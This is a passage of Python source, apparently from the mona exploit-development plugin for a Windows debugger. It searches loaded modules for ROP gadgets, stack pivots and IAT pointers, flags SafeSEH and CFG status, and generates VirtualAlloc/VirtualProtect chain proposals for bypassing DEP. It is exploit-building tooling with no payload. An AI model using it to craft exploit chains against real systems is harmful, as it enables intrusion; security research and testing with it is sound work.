		dbgp("Searching in IAT of %s (%d out of %d modules)" % (key, keycnt, nrkeys))
		keycnt += 1
		#is this module going to get rebase ?
		themodule = MnModule(key)
		isrebased = themodule.isRebase
		if not silent:
			dbg.log("    Querying %s" % (key))
		dbg.log("    - Enumerating IAT (%s)" % key)   
		allfuncs = themodule.getIAT()
		dbg.log("    - Done enumerating IAT for %s. Got %d entries" % (key, len(allfuncs)))
		dbg.updateLog()
		for fn in allfuncs:
			thisfuncname = allfuncs[fn].lower()
			thisfuncfullname = thisfuncname
			if not meetsCriteria(MnPointer(fn), criteria):
				continue
			ptr = 0
			try:
				ptr=struct.unpack('<L',dbg.readMemory(fn,4))[0]
			except Exception as e:
				if not silent:
					dbg.log("Error reading memory at %s in findROPFunc: %s" % (PTR_PRINT % fn, str(e)))
				pass
			if ptr != 0:
				# get offset to one of the offset functions
				# where does pointer belong to ?
				pmodname = MnPointer(ptr).belongsTo()
				if pmodname != "":
					if pmodname.lower() in offsets:
						# find distance to each of the interesting functions in this module
						for interestingfunc in offsets[pmodname.lower()]:
							if interestingfunc in offsetpointers:
								offsetvalue = offsetpointers[interestingfunc] - ptr
								operator = ""
								if offsetvalue < 0:
									operator = "-"
								offsetvaluehex = toHex(offsetvalue).replace("-","")
								thetype = "(%s - IAT 0x%s : %s.%s (0x%s), offset to %s!%s (0x%s) : %d (%s0x%s)" % (key,toHex(fn),pmodname,thisfuncfullname,toHex(ptr),pmodname,interestingfunc,toHex(offsetpointers[interestingfunc]),offsetvalue,operator,offsetvaluehex)
								if not thetype in ropfuncoffsets:
									ropfuncoffsets[thetype] = [fn]
				
				# see if it's a function we are looking for
				for funcsearch in functionnames:
					funcsearch = funcsearch.lower()
					if thisfuncname.find(funcsearch) > -1:
						extra = ""
						extrafunc = ""
						if isrebased:
							extra = " [Warning : module is likely to get rebased !]"
							extrafunc = "-rebased"
						if not silent:
							dbg.log("    0x%s : ptr to %s (0x%s) (%s) %s" % (toHex(fn),thisfuncname,toHex(ptr),key,extra))
						logtxt = thisfuncfullname.lower().strip()+extrafunc+" | 0x" + toHex(ptr)
						if logtxt in ropfuncs:
								ropfuncs[logtxt] += [fn]
						else:
								ropfuncs[logtxt] = [fn]
						ptr_counter += 1
						if ptr_to_get > 0 and ptr_counter >= ptr_to_get:
							ropfuncs,ropfuncoffsets

	return ropfuncs,ropfuncoffsets

def assemble(instructions,encoder=""):
	"""
	Assembles one or more instructions to opcodes

	Arguments:
	instructions = the instructions to assemble (separated by # or ;)

	Return:
	Dictionary (pointers)
	"""
	if not silent:
		dbg.log("Opcode results: ")
		dbg.log("--------------- ")
	allopcodes=""

	instructions = instructions.replace('"',"").replace("'","").lower()
	instructions = [i for i in re.split(r'[;#]', instructions) if i]

	for instruct in instructions:
		try:
			instruct = instruct.strip()
			assembled=dbg.assemble(instruct)
			strAssembled=""
			for assemOpc in assembled:
				if (len(hex(_ord(assemOpc)))) == 3:
					subAssembled = "\\x0"+hex(_ord(assemOpc)).replace('0x','')
					strAssembled = strAssembled+subAssembled
				else:
					strAssembled =  strAssembled+hex(_ord(assemOpc)).replace('0x', '\\x')
			if len(strAssembled) < 30:
				if not silent:
					dbg.log(" %s = %s" % (instruct,strAssembled))
				allopcodes=allopcodes+strAssembled
			else:
				if not silent:
					dbg.log(" %s => Unable to assemble this instruction !" % instruct,highlight=1)
		except Exception as e:
			if not silent:
				dbg.log("   Could not assemble %s " % instruct)
				dbg.log("   %s" % str(e))
				dbgp(traceback.format_exc(), errormode=False)
			pass
	if not silent:
		dbg.log(" Full opcode : %s " % allopcodes)
	return allopcodes
	

def get_eta(startmoment, done, total):
	"""
	Returns ETA string or 'calculating eta...'
	If remaining time < 10 minutes, also shows remaining duration.

	Arguments:
	startmoment - timestamp from time.time()
	done        - number of items processed so far
	total       - total number of items

	Return:
	string
	"""

	# do we need to interrupt mona?
	interruptMona()

	now = time.time()
	elapsed = now - startmoment

	if done <= 0 or elapsed <= 0 or total <= 0:
		return "calculating eta..."

	# 👉 New logic: wait until at least 10% is done
	percent_done = (float(done) / float(total)) * 100.0
	if percent_done < 10.0:
		return "Reporting ETA as soon as we get to 10%"

	# Blend the overall average speed with the most recent observed speed.
	# This reduces pessimistic early ETAs caused by startup overhead while
	# still damping sudden fluctuations from short update windows.
	state_key = (int(startmoment), int(total))
	if not hasattr(get_eta, "_state"):
		get_eta._state = {}

	state = get_eta._state.get(state_key)
	global_rate = float(done) / elapsed
	recent_rate = 0.0

	if state:
		prev_done = state.get("done", 0)
		prev_time = state.get("time", 0.0)
		delta_done = done - prev_done
		delta_time = now - prev_time
		if delta_done > 0 and delta_time > 0:
			recent_rate = float(delta_done) / delta_time

	get_eta._state[state_key] = {"done": done, "time": now}

	if recent_rate > 0:
		rate = (recent_rate * 0.7) + (global_rate * 0.3)
	else:
		rate = global_rate

	if rate <= 0:
		return "calculating eta..."

	remaining = total - done
	if remaining <= 0:
		try:
			del get_eta._state[state_key]
		except Exception:
			pass
		return get_current_datetime()

	eta_seconds = remaining / rate
	eta_time = now + eta_seconds

	eta_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(eta_time))

	# If less than 15 minutes remaining → add human-readable duration
	if eta_seconds < 900:
		secs = int(eta_seconds)
		mins = secs // 60
		secs = secs % 60

		if mins > 0:
			duration = "%dm %ds" % (mins, secs)
		else:
			duration = "%ds" % secs

		return "%s (%s remaining)" % (eta_str, duration)

	return eta_str


	
def findROPGADGETS(modulecriteria={},criteria={},endings=[],maxoffset=40,depth=5,split=False,pivotdistance=0,fast=False,mode="all", sortedprint=False, technique=""):
	"""
	Searches for rop gadgets

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.
	endings - array with all rop gadget endings to look for. Default : RETN and RETN+offsets
	maxoffset - maximum offset value for RETN if endings are set to RETN
	depth - maximum number of instructions to go back
	split - Boolean that indicates whether routine should write all gadgets to one file, or split per module
	pivotdistance - minimum distance a stackpivot needs to be
	fast - Boolean indicating if you want to process less obvious gadgets as well
	mode - internal use only
	sortedprint - sort pointers before printing output to rop.txt
	technique - create all chains if empty. otherwise, create virtualalloc or virtualprotect chain (based on what is specified)
	
	Return:
	Output is written to files, containing rop gadgets, suggestions, stack pivots and virtualprotect/virtualalloc routine (if possible)
	"""



	dbgp(get_current_function_name())
	
	found_opcodes = {}
	all_opcodes = {}
	ptr_counter = 0
	valid_techniques = ["virtualalloc", "virtualprotect"]

	modulestosearch = getModulesToQuery(modulecriteria)
	
	progressid=str(dbg.getDebuggedPid())
	progressfilename="_rop_progress_"+dbg.getDebuggedName()+"_"+progressid+".log"
	
	objprogressfile = MnLog(progressfilename)
	progressfile = objprogressfile.reset(skipModuleTable=True)
	dbg.log("[+] Criteria in use: %s" % criteriaToText(modulecriteria))
	dbg.log("[+] Progress will be written to %s" % progressfilename)
	dbg.log("[+] Maximum offset : %d" % maxoffset)
	dbg.log("[+] (Minimum/optional maximum) stackpivot distance : %s" % str(pivotdistance))
	dbg.log("[+] Max nr of instructions : %d" % depth)
	dbg.log("[+] Split output into module rop files ? %s" % split)
	#dbg.log("[+] Technique: %s" % technique)    
	if technique != "" and technique in valid_techniques:
		dbg.log("[+] Only creating rop chain for '%s'" % technique)
	else:
		if technique != "":
			dbg.log("[+] Going to create rop chains for all relevant/supported techniques: %s" % technique)
	usefiles = False
	filestouse = []
	vplogtxt = ""
	suggestions = {}
	bypasscfg = False

	if "cfg" in criteria:
		bypasscfg = criteria["cfg"]
	if "f" in criteria:
		if criteria["f"] != "":
			if type(criteria["f"]).__name__.lower() != "bool":		
				usefiles = True
				rawfilenames = criteria["f"].replace('"',"")
				allfiles = [getAbsolutePath(f) for f in rawfilenames.split(',')]
				#check if files exist
				dbg.log("[+] Attempting to use %d rop file(s) as input" % len(allfiles))
				for fname in allfiles:
					fname = fname.strip()
					if not os.path.exists(fname):
						dbg.log("     ** %s : Does not exist !" % fname, highlight=1)
					else:
						filestouse.append(fname)
				if len(filestouse) == 0:
					dbg.log(" ** Unable to find any of the source files, aborting... **", highlight=1)
					return
		
	search = []
	
	if not usefiles:
		if len(endings) == 0:
			#RETN only
			search.append("retn")
			for i in range(0, maxoffset + 1, 2):
				search.append("retn 0x"+ toHexByte(i))
		else:
			for ending in endings:
				dbg.log("[+] Custom ending : %s" % ending)
				if ending != "":
					search.append(ending)
		if len(modulestosearch) == 0:
			dbg.log("[-] No modules selected, aborting search", highlight = 1)
			return
		if bypasscfg:
			dbg.log("[+] Going to identify and log valid CFG target gadgets. (Will slow things down a bit)")
		dbg.log("[+] Enumerating %d endings in %d module(s)..." % (len(search),len(modulestosearch)))
		for thismodule in modulestosearch:
			dbg.log("    - Querying module %s" % thismodule)
			dbg.updateLog()
			#search
			found_opcodes = searchInModule(search,thismodule,criteria)
			#merge results
			all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
		dbg.log("")
		dbg.log("    Search for gadget endings complete.")
		dbg.log("      Results:")
		dbg.log("")
	else:
		dbg.log("[+] Reading input files")
		for filename in filestouse:
			dbg.log("     - Reading %s" % filename)
			all_opcodes = mergeOpcodes(all_opcodes,readGadgetsFromFile(filename))
			
	dbg.updateLog()
	tp = 0
	ending_cnt = {}
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			if usefiles:
				#dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype]) // 2))
				tp = tp + len(all_opcodes[endingtype]) // 2
			else:
				#dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype])))
				tp = tp + len(all_opcodes[endingtype])

			ending_cnt[endingtype] = len(all_opcodes[endingtype])


	headers = ["Ending", "Count"]
	types   = ["string", "int"]

	print_dict_table(ending_cnt, headers, types, padding = "      ", itemsequence = [])
	dbg.log("")

	global silent
	if not usefiles:		
		dbg.log("[+] Expanding and filtering gadgets for %d endings" % tp)
	else:
		dbg.log("    - Categorizing %d gadget endings" % tp)
		silent = True
	dbg.updateLog()
	ropgadgets = {}
	interestinggadgets = {}
	# won't store chain details, we can pick them up from ropgadgets
	valid_cfg_target_gadgets = []
	stackpivots = {}
	stackpivots_safeseh = {}
	adcnt = 0
	tc = 1
	issafeseh = False
	step = 0
	updateth = 1000
	if (tp >= 2000 and tp < 5000):
		updateth = 500
	if (tp < 2000):
		updateth = 100
	if DEBUG_MODE:
		updateth = updateth // 2
	startmoment = time.time()
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			dbgp("In loop for endingtype %s in all_opcodes. Len(allopcodes[endingtype]) : %d" % (endingtype, len(all_opcodes[endingtype])))
			for endingtypeptr in all_opcodes[endingtype]:
				adcnt=adcnt+1
				if usefiles:
					adcnt = adcnt - 0.5
				done = tc * updateth
				if adcnt > done:
					thistimestamp=get_current_datetime()
					eta = get_eta(startmoment, done, tp)
					updatetext = "      - {done} / {total} items processed ({ts}) - ({pct:.2f}%) - ETA: {eta}".format(
						done=done,
						total=tp,
						ts=thistimestamp,
						pct=(done * 100.0) / tp,
						eta=eta
					)
					ropcounttxt = "        Nr of gadgets so far: %d " % len(ropgadgets)

					objprogressfile.write(updatetext.strip(),progressfile)
					objprogressfile.write(ropcounttxt.strip(),progressfile)
					dbg.log(updatetext)
					dbg.log(ropcounttxt)
					dbg.updateLog()
					dbgp("Number of ropgadgets: %d" % len(ropgadgets))
					dbgp("Number of stackpivots: %d" % len(stackpivots))
					dbgp("Number of safeseh stackpivots: %d" % len(stackpivots_safeseh))					
					tc += 1				
				if not usefiles:
					#first get max backward instruction
					#immlib libanalyze might blow up at (self.ip=opcode[0]  # Instruction pointer), so we have to catch exceptions here
					thisptr = 0
					try:
						thisopcode = dbg.disasmBackward(endingtypeptr,depth+1)
						thisptr = thisopcode.getAddress()
					except:
						dbg.log("        ** Unable to backward disassemble at 0x%0x, depth %d, skipping location\n" % (endingtypeptr, depth+1))
						dbgp(traceback.format_exc(), errormode=False)
						thisopcode = ""
						thisptr = 0

					# we now have a range to mine
					startptr = thisptr
					dbgp("Create & check all possible chains in range between 0x%x and 0x%x" % (startptr, endingtypeptr))
					currentmodulename = MnPointer(thisptr).belongsTo()
					modinfo = MnModule(currentmodulename)
					issafeseh = modinfo.isSafeSEH
					iscfg = modinfo.isCFG
					dbgp("Enumerating gadgets from module %s. CFG: %s" % (currentmodulename, str(iscfg)))

					while startptr <= endingtypeptr and startptr != 0x0:

						# get the entire chain from startptr to endingtypeptr
						try:
							thischain = ""
							msfchain = []
							thisopcodebytes = ""
							chainptr = startptr
							if isGoodGadgetPtr(startptr,criteria): 
								# only lookup if it's a good gadget
								if not startptr in ropgadgets and not startptr in interestinggadgets:
									#if DEBUG_MODE:
									#	dbgp("Address 0x%x passed the isGoodGadgetPtr test" % startptr)
									invalidinstr = False
									#dbgp("Chainptr 0x%08x, Endingtypeptr 0x%08x, Invalidinstr: %s (Before start of loop)" % (chainptr, endingtypeptr, invalidinstr))	
									avoidunlimitedloop = 0
									while chainptr < endingtypeptr and not invalidinstr and avoidunlimitedloop < 100:
										thisopcode = dbg.disasm(chainptr)
										thisinstruction = getDisasmInstruction(thisopcode)
										if isGoodGadgetInstr(thisinstruction) and not isGadgetEnding(thisinstruction,search):						
											thischain =  thischain + " # " + thisinstruction
											msfchain.append([chainptr,thisinstruction])
											thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
											#if DEBUG_MODE:
											#	dbgp("Current position: 0x%x" % chainptr)
											nextchainptr = dbg.disasmForwardAddressOnly(chainptr,1)
											if nextchainptr == chainptr:
												# problem disasmForward, just quit the loop
												invalidinstr = True
											else:
												chainptr = nextchainptr
											#if DEBUG_MODE:
											#	dbgp("Next position: 0x%x" % chainptr)
										else:
											invalidinstr = True
										avoidunlimitedloop += 1
									dbgp("Chain at 0x%x, Endingtypeptr 0x%x,  Invalidinstr: %s, endingtypeptr , chain %s" % (startptr, endingtypeptr, invalidinstr, thischain))				
									if endingtypeptr == chainptr and startptr != chainptr and not invalidinstr:
										if not startptr in ropgadgets:
											fullchain = thischain + " # " + endingtype.lower()
											msfchain.append([endingtypeptr,endingtype])
											thisopcode = dbg.disasm(endingtypeptr)
											thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
											msfchain.append(["raw",thisopcodebytes])
											if isInterestingGadget(fullchain):
												interestinggadgets[startptr] = fullchain
												dbgp("Added %s to interestinggadgets" % (PTR_PRINT % startptr))
												#this may be a good stackpivot too
												stackpivotdistance = getStackPivotDistance(fullchain,pivotdistance) 
												if stackpivotdistance > 0:
													#safeseh or not ?
													if issafeseh:
														if not stackpivotdistance in stackpivots_safeseh:
															stackpivots_safeseh[stackpivotdistance] = [[startptr,fullchain]]
														else:
															stackpivots_safeseh[stackpivotdistance].append([startptr,fullchain])
													else:
														if not stackpivotdistance in stackpivots:
															stackpivots[stackpivotdistance] = [[startptr,fullchain]]
														else:
															stackpivots[stackpivotdistance].append([startptr,fullchain])
													dbgp("Added %s to interesting gadgets" % (PTR_PRINT % startptr))
								
											ropgadgets[startptr] = fullchain
											dbgp("Added %s to ropgadgets " % (PTR_PRINT % startptr))

											if bypasscfg and iscfg:
												# only allow CFG Compatible pointers 
												cfg_compatible_pointer = modinfo.checkCFGCompatible(startptr)
												dbgp("Is %s (%s) CFG compatible? %s " % (PTR_PRINT % startptr,currentmodulename, cfg_compatible_pointer))											
												if cfg_compatible_pointer:
													valid_cfg_target_gadgets.append(startptr)
													dbgp("Added %s to CFG Compatible gadgets " % (PTR_PRINT % startptr))

							startptr = startptr+1
						except Exception as ropex:
							dbgp("Error while looking for gadgets: %s" % str(ropex), errormode=False)
							dbgp(traceback.format_exc(), errormode=False)
							interruptMona()
							continue
				else:
					if step == 0:
						startptr = endingtypeptr
					if step == 1:
						thischain = endingtypeptr
						chainptr = startptr
						ptrx = MnPointer(chainptr)
						modname = ptrx.belongsTo()
						issafeseh = False
						if modname != "":
							thism = MnModule(modname)
							issafeseh = thism.isSafeSEH
						if isGoodGadgetPtr(startptr,criteria) and not startptr in ropgadgets and not startptr in interestinggadgets:
							fullchain = thischain
							if isInterestingGadget(fullchain):
								interestinggadgets[startptr] = fullchain
								#this may be a good stackpivot too
								stackpivotdistance = getStackPivotDistance(fullchain,pivotdistance)
								dbgp("%s: stackivot distance %d" % (fullchain, stackpivotdistance))
								if stackpivotdistance > 0:
									#safeseh or not ?
									if issafeseh:
										if not stackpivotdistance in stackpivots_safeseh:
											stackpivots_safeseh[stackpivotdistance] = [[startptr,fullchain]]
										else:
											stackpivots_safeseh[stackpivotdistance].append([startptr,fullchain])
									else:
										if not stackpivotdistance in stackpivots:
											stackpivots[stackpivotdistance] = [[startptr,fullchain]]
										else:
											stackpivots[stackpivotdistance].append([startptr,fullchain])	
							else:
								if not fast:
									ropgadgets[startptr] = fullchain
						step = -1
					step += 1
	
	thistimestamp = get_current_datetime()
	updatetext = "      - " + str(tp) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (100%)"
	objprogressfile.write(updatetext.strip(),progressfile)
	dbg.log(updatetext)
	dbg.updateLog()
	dbgp("Final Number of ropgadgets: %d" % len(ropgadgets))
	dbgp("Final Number of stackpivots: %d" % len(stackpivots))
	dbgp("Final Number of safeseh stackpivots: %d" % len(stackpivots_safeseh))
	dbgp("Final Number of valid CFG target gadgets: %d" % len(valid_cfg_target_gadgets))			

	if mode == "all":
		if len(ropgadgets) > 0 and len(interestinggadgets) > 0:
			# another round of filtering
			dbg.log("")
			updatetext = "[+] Creating suggestions list"
			dbg.log(updatetext)
			objprogressfile.write(updatetext.strip(),progressfile)
			suggestions = getRopSuggestion(interestinggadgets,ropgadgets)
			#see if we can propose something
			updatetext = "[+] Processing suggestions"
			dbg.log(updatetext)
			objprogressfile.write(updatetext.strip(),progressfile)
			suggtowrite=""
			for suggestedtype in suggestions:
				limitnr = 0x7fffffff
				if suggestedtype.startswith("pop "):		# only write up to 10 pop r32 into suggestions file
					limitnr = 10
				gcnt = 0

				suggtowrite += "[%s]\n" % suggestedtype
				for suggestedpointer in suggestions[suggestedtype]:
					if gcnt < limitnr:
						sptr = MnPointer(suggestedpointer)
						modname = sptr.belongsTo()
						modinfo = MnModule(modname)
						if not modinfo.moduleBase.__class__.__name__ == "instancemethod":
							rva = suggestedpointer - modinfo.moduleBase	
						suggesteddata = suggestions[suggestedtype][suggestedpointer]
						if not modinfo.moduleBase.__class__.__name__ == "instancemethod":
							ptrinfo = "0x" + toHex(suggestedpointer) + " (RVA : 0x" + toHex(rva) + ") : " + suggesteddata + "    ** [" + modname + "] **   |  " + sptr.__str__()+"\n"
						else:
							ptrinfo = "0x" + toHex(suggestedpointer) + " : " + suggesteddata + "    ** [" + modname + "] **   |  " + sptr.__str__()+"\n"
						suggtowrite += ptrinfo
					else:
						break
					gcnt += 1
			if arch == 32:
				dbg.log("")
				dbg.log("[+] Launching ROP generator")
				updatetext = "Attempting to create rop chain proposals"
				objprogressfile.write(updatetext.strip(),progressfile)
				vplogtxt = createRopChains(suggestions,interestinggadgets,ropgadgets,modulecriteria,criteria,objprogressfile,progressfile,technique)
				dbg.logLines(vplogtxt.replace("\t","    "))
				dbg.log("    ROP generator finished")
		else:
			updatetext = "[+] Oops, no gadgets found, aborting.."
			dbg.log(updatetext)
			objprogressfile.write(updatetext.strip(),progressfile)		

		if arch == 64:
			dbg.log("")
			dbg.log("[+] There is no automated ROP generator for 64bit in mona (yet)")
			dbg.log("    But I will get you some IAT locations where you can find interesting functions")
			updatetext = "[+] Getting ropfunc information"
			objprogressfile.write(updatetext.strip(),progressfile)
			routines = "virtualalloc", "virtualprotect"
			for routine in routines:
				dbg.log("    - Looking for IAT entries to %s" % routine)
				funcptr,functext = getRopFuncPtr(routine,modulecriteria,criteria,"iat", objprogressfile, progressfile)
				if funcptr > 0:
					updatetext = "   0x%s : 0x%s" % (PTR_PRINT % funcptr, functext)
					dbg.log(updatetext)
					objprogressfile.write(updatetext.strip(),progressfile)

	#done, write to log files
	dbg.setStatusBar("Writing to logfiles...")
	dbg.log("")
	logfile = MnLog("stackpivot.txt")
	thislog = logfile.reset()	
	objprogressfile.write("Writing records for " + str(len(stackpivots)+len(stackpivots_safeseh))+" unique stackpivot distances (with minimum offset " + str(pivotdistance)+") to file " + thislog,progressfile)
	dbg.log("[+] Writing stackpivots to file " + thislog)
	logfile.write("Stack pivots, minimum distance " + str(pivotdistance) + ", in descending order",thislog)
	logfile.write("------------------------------------------------------------------------------",thislog)
	logfile.write("", thislog)
	logfile.write("", thislog)
	if arch == 32:
		logfile.write("Non-SafeSEH protected pivots :",thislog)
		logfile.write("------------------------------",thislog)
		logfile.write("", thislog)	
	arrtowrite = ""	
	pivotcount = 0
	startmoment = time.time()
	flipover = 0
	try:
		with open(thislog,"a") as fh:
			arrtowrite = ""
			stackpivots_index = sorted(stackpivots, reverse=True) # returns sorted keys as an array, in descending order
			for sdist in stackpivots_index:
				for spivot, schain in stackpivots[sdist]:
					ptrx = MnPointer(spivot)
					modname = ptrx.belongsTo()
					sdisthex = "%02x" % sdist
					ptrinfo = "0x" + toHex(spivot) + " : {pivot " + str(sdist) + " / 0x" + sdisthex + "} : " + schain + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
					pivotcount += 1
					arrtowrite += ptrinfo
					
			fh.writelines(arrtowrite)
	except:
		pass
	logfile.write("", thislog)
	logfile.write("", thislog)
	if arch == 32:
		logfile.write("", thislog)	
		logfile.write("**********************************************************************************************************", thislog)
		logfile.write("", thislog)		
		logfile.write("", thislog)	
		logfile.write("", thislog)		
		logfile.write("SafeSEH protected pivots :",thislog)
		logfile.write("--------------------------",thislog)	
		logfile.write("", thislog)	
	arrtowrite = ""	
	startmoment = time.time()
	flipover = 0

	try:
		with open(thislog, "a") as fh:
			arrtowrite = ""
			stackpivots_safeseh_index = sorted(stackpivots_safeseh, reverse=True)
			for sdist in stackpivots_safeseh_index:
				for spivot, schain in stackpivots_safeseh[sdist]:
					ptrx = MnPointer(spivot)
					modname = ptrx.belongsTo()
					#modinfo = MnModule(modname)
					sdisthex = "%02x" % sdist
					ptrinfo = "0x" + toHex(spivot) + " : {pivot " + str(sdist) + " / 0x" + sdisthex + "} : " + schain + "    ** [" + modname + "] SafeSEH **   |  " + ptrx.__str__()+"\n"
					pivotcount += 1
					arrtowrite += ptrinfo

			fh.writelines(arrtowrite)
	except:
		pass	
	dbg.log("    Wrote %d pivots to file " % pivotcount)
	arrtowrite = ""
	if mode == "all":
		if len(suggestions) > 0:
			logfile = MnLog("rop_suggestions.txt")
			thislog = logfile.reset()
			objprogressfile.write("Writing all suggestions to file "+thislog,progressfile)
			dbg.log("[+] Writing suggestions to file " + thislog )
			logfile.write("Suggestions",thislog)
			logfile.write("-----------",thislog)
			with open(thislog, "a") as fh:
				fh.writelines(suggtowrite)
				fh.write("\n")
			nrsugg = len(suggtowrite.split("\n"))
			dbg.log("    Wrote %d suggestions to file" % nrsugg)


		if bypasscfg:
			dbg.log("")
			logfile = MnLog("rop_cfg.txt")
			thislog = logfile.reset()
			objprogressfile.write("Gathering CFG Compatible targets", progressfile)
			dbg.log("[+] Writing results to file " + thislog + " (" + str(len(valid_cfg_target_gadgets))+" cfg compatible target gadgets)")
			logfile.write("CFG Compatible target gadgets",thislog)
			logfile.write("-----------------------------",thislog)
			dbg.updateLog()
			try:
				with open(thislog, "a") as fh:
					arrtowrite = ""
					flipover = 0
					gcount = 0
					startmoment = time.time()
					for gadget in valid_cfg_target_gadgets:
						ptrx = MnPointer(gadget)
						modname = ptrx.belongsTo()
						# pick up the details in ropgadgets
						ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
						arrtowrite += ptrinfo
						flipover += 1
						gcount += 1
						if flipover > 5000:
							eta = get_eta(startmoment, gcount , len(valid_cfg_target_gadgets))
							dbg.log("    Update: ETA: %s (%d/%d)" % (eta, gcount, len(valid_cfg_target_gadgets)))
							flipover = 0
					objprogressfile.write("Writing results to file " + thislog + " (" + str(len(valid_cfg_target_gadgets))+" CFG Compatible target gadgets)",progressfile)
					fh.writelines(arrtowrite)
				dbg.log("    Wrote %d CFG Compatible target gadgets to file" % len(valid_cfg_target_gadgets))
			except:
				pass
			

		if not split:
			dbg.log("")
			logfile = MnLog("rop.txt")
			thislog = logfile.reset()
			objprogressfile.write("Gathering interesting gadgets",progressfile)
			dbg.log("[+] Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)")
			logfile.write("Interesting gadgets",thislog)
			logfile.write("-------------------",thislog)
			dbg.updateLog()
			try:
				with open(thislog, "a") as fh:
					arrtowrite = ""
					flipover = 0
					gcount = 0
					startmoment = time.time()
					if sortedprint:
						arrptrs = []
						dbg.log("    Sorting interesting gadgets first")
						for gadget in interestinggadgets:
							arrptrs.append(gadget)
						arrptrs.sort()
						dbg.log("    Done sorting, let's go")
						for gadget in arrptrs:
							ptrx = MnPointer(gadget)
							modname = ptrx.belongsTo()
							#modinfo = MnModule(modname)
							ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
							arrtowrite += ptrinfo
							flipover += 1
							gcount += 1
							if flipover > 5000:
								eta = get_eta(startmoment, gcount , len(arrptrs))
								dbg.log("    Update: ETA: %s (%d/%d)" % (eta, gcount, len(arrptrs)))
								flipover = 0	
					else:
						for gadget in interestinggadgets:
							ptrx = MnPointer(gadget)
							modname = ptrx.belongsTo()
							#modinfo = MnModule(modname)
							ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
							arrtowrite += ptrinfo
							flipover += 1
							gcount += 1
							if flipover > 5000:
								eta = get_eta(startmoment, gcount , len(interestinggadgets))
								dbg.log("    Update: ETA: %s (%d/%d)" % (eta, gcount, len(interestinggadgets)))
								flipover = 0
					objprogressfile.write("Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)",progressfile)
					fh.writelines(arrtowrite)
				dbg.log("    Wrote %d interesting gadgets to file" % len(interestinggadgets))
			except:
				pass
			arrtowrite=""
			if not fast:
				objprogressfile.write("Enumerating other gadgets (" + str(len(ropgadgets))+")",progressfile)
				dbg.log("[+] Writing other gadgets to file " + thislog + " (" + str(len(ropgadgets))+" gadgets)")
				try:
					logfile.write("",thislog)
					logfile.write("Other gadgets",thislog)
					logfile.write("-------------",thislog)
					startmoment = time.time()
					flipover = 0
					gcount = 0
					with open(thislog, "a") as fh:
						arrtowrite=""
						if sortedprint:
							arrptrs = []
							dbg.log("    Sorting other gadgets too")
							for gadget in ropgadgets:
								arrptrs.append(gadget)
							arrptrs.sort()
							dbg.log("    Done sorting, let's go")
							for gadget in arrptrs:
								ptrx = MnPointer(gadget)
								modname = ptrx.belongsTo()
								#modinfo = MnModule(modname)
								ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
								arrtowrite += ptrinfo
								flipover += 1
								gcount += 1
								if flipover > 2000:
									eta = get_eta(startmoment, gcount , len(ropgadgets))
									dbg.log("    Update: ETA: %s (%d/%d)" % (eta, gcount, len(ropgadgets)))
									objprogressfile.write("    Enumerating (sorted) - update: %s" % eta)
									flipover = 0	
						else:	
							for gadget in ropgadgets:
								ptrx = MnPointer(gadget)
								modname = ptrx.belongsTo()
								#modinfo = MnModule(modname)
								ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
								arrtowrite += ptrinfo
								flipover += 1
								gcount += 1
								if flipover > 2000:
									eta = get_eta(startmoment, gcount , len(ropgadgets))
									dbg.log("    Update: ETA: %s (%d/%d)" % (eta, gcount, len(ropgadgets)))
									objprogressfile.write("    Enumerating - update: %s" % eta)
									flipover = 0	

						dbg.log("    Wrote %d other gadgets to file" % len(ropgadgets))
						objprogressfile.write("Writing results to file " + thislog + " (" + str(len(ropgadgets))+" other gadgets)",progressfile)
						fh.writelines(arrtowrite)
				except:
					pass
			
		else:
			dbg.log("[+] Writing results to individual files (grouped by module)")
			dbg.updateLog()
			for thismodule in modulestosearch:
				thismodname = thismodule.replace(" ","_")
				thismodversion = getModuleProperty(thismodule,"version")
				logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
				thislog = logfile.reset()
				logfile.write("Interesting gadgets",thislog)
				logfile.write("-------------------",thislog)
			for gadget in interestinggadgets:
				ptrx = MnPointer(gadget)
				modname = ptrx.belongsTo()
				modinfo = MnModule(modname)
				thismodversion = getModuleProperty(modname,"version")
				thismodname = modname.replace(" ","_")
				logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
				thislog = logfile.reset(False)
				ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
				with open(thislog, "a") as fh:
					fh.write(ptrinfo)
			if not fast:
				for thismodule in modulestosearch:
					thismodname = thismodule.replace(" ","_")
					thismodversion = getModuleProperty(thismodule,"version")
					logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
					logfile.write("Other gadgets",thislog)
					logfile.write("-------------",thislog)
				for gadget in ropgadgets:
					ptrx = MnPointer(gadget)
					modname = ptrx.belongsTo()
					modinfo = MnModule(modname)
					thismodversion = getModuleProperty(modname,"version")
					thismodname = modname.replace(" ","_")
					logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
					thislog = logfile.reset(False)
